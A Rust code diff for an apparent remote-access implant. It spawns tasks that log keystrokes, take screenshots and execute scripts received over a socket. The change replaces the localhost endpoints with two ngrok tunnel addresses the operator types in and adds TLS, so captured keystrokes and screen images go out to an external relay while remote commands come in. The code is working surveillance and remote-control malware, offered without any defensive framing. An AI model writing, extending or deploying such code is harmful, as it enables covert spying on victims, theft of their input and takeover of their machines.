@@ -3,7 +3,7 @@ use tokio::sync::mpsc;
 use tokio::sync::mpsc::{Sender, Receiver};
 use tokio::net::TcpStream;
 use tokio::time::Duration;
-use tokio_tungstenite::{connect_async, tungstenite::protocol::Message, WebSocketStream};
+use tokio_tungstenite::{connect_async_tls_with_config, tungstenite::protocol::Message, WebSocketStream};
 
 use futures_util::stream::SplitSink;
 use futures_util::{SinkExt, StreamExt};
@@ -18,58 +18,94 @@ use bytes::Bytes;
 use std::io::ErrorKind::WouldBlock;
 use std::thread;
 use std::process::Command;
+use std::io::{stdin, stdout, Write};
 
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
 
 const FPS: f32 = 1.0;
 
+struct NgrokAddrs {
+    addr1: String,
+    addr2: String,
+}
+
 #[tokio::main]
 async fn main() -> io::Result<()> {
-    let tcpsocket = TcpStream::connect("127.0.0.1:7878").await?;
-    let (websocket, _) = 
-        connect_async("ws://127.0.0.1:8080/ws").await.expect("failed to connect");
+    match get_ngrok_addrs() {
+        Ok(ngrok) => {
+            let tcpsocket = TcpStream::connect(ngrok.addr1).await?;
+            let (websocket, _) = 
+                connect_async_tls_with_config(
+                    ngrok.addr2, 
+                    None, 
+                    false,
+                    None,
+                )
+                .await
+                .expect("failed to connect");
 
-    let (rd_txt, wr_txt) = io::split(tcpsocket);
-    let (write, _) = websocket.split(); 
+            let (rd_txt, wr_txt) = io::split(tcpsocket);
+            let (write, _) = websocket.split(); 
 
-    let (tx1, rx1) = mpsc::channel::<String>(16);
-    let (tx2, rx2) = mpsc::channel::<Vec<u8>>(32);
+            let (tx1, rx1) = mpsc::channel::<String>(16);
+            let (tx2, rx2) = mpsc::channel::<Vec<u8>>(32);
 
-    let worker_a = 
-        tokio::spawn(async move {
-            read_keystrokes(tx1)
-        });
-        
-    let worker_b = 
-        tokio::spawn(async move {
-            send_keystrokes(rx1, wr_txt).await
-        });
+            let worker_a = 
+                tokio::spawn(async move {
+                    read_keystrokes(tx1)
+                });
+                
+            let worker_b = 
+                tokio::spawn(async move {
+                    send_keystrokes(rx1, wr_txt).await
+                });
 
-    let worker_c = 
-        tokio::spawn(async move {
-            take_screenshot(tx2).await
-        });
+            let worker_c = 
+                tokio::spawn(async move {
+                    take_screenshot(tx2).await
+                });
 
-    let workder_d = 
-        tokio::spawn(async move {
-            send_screenshot(rx2, write).await
-        });
+            let workder_d = 
+                tokio::spawn(async move {
+                    send_screenshot(rx2, write).await
+                });
 
-    let worker_f = 
-        tokio::spawn(async move {
-            exec_script(rd_txt).await
-        });
+            let worker_f = 
+                tokio::spawn(async move {
+                    exec_script(rd_txt).await
+                });
 
-    let _ = tokio::try_join!(
-        worker_a, 
-        worker_b, 
-        worker_c, 
-        workder_d, 
-        worker_f,
-    );
+            let _ = tokio::try_join!(
+                worker_a, 
+                worker_b, 
+                worker_c, 
+                workder_d, 
+                worker_f,
+            );
+        },
+        Err(e) => println!("some error occured: {}", e),
+    }
 
     Ok(())
+}
+
+fn get_ngrok_addrs() -> Result<NgrokAddrs, std::io::Error> {
+    let mut addr1 = String::new();
+    let mut addr2 = String::new();
+
+    print!("[addr1] enter the first ngrok address: ");
+    stdout().flush()?;
+    stdin().read_line(&mut addr1).expect("cannot read line");
+
+    print!("[addr2] enter the second ngrok address: ");
+    stdout().flush()?;
+    stdin().read_line(&mut addr2).expect("cannot read line");
+
+    Ok(NgrokAddrs { 
+        addr1: addr1.trim().to_string(),
+        addr2: addr2.trim().to_string(),
+    })
 }
 
 fn read_keystrokes(tx: Sender<String>) {
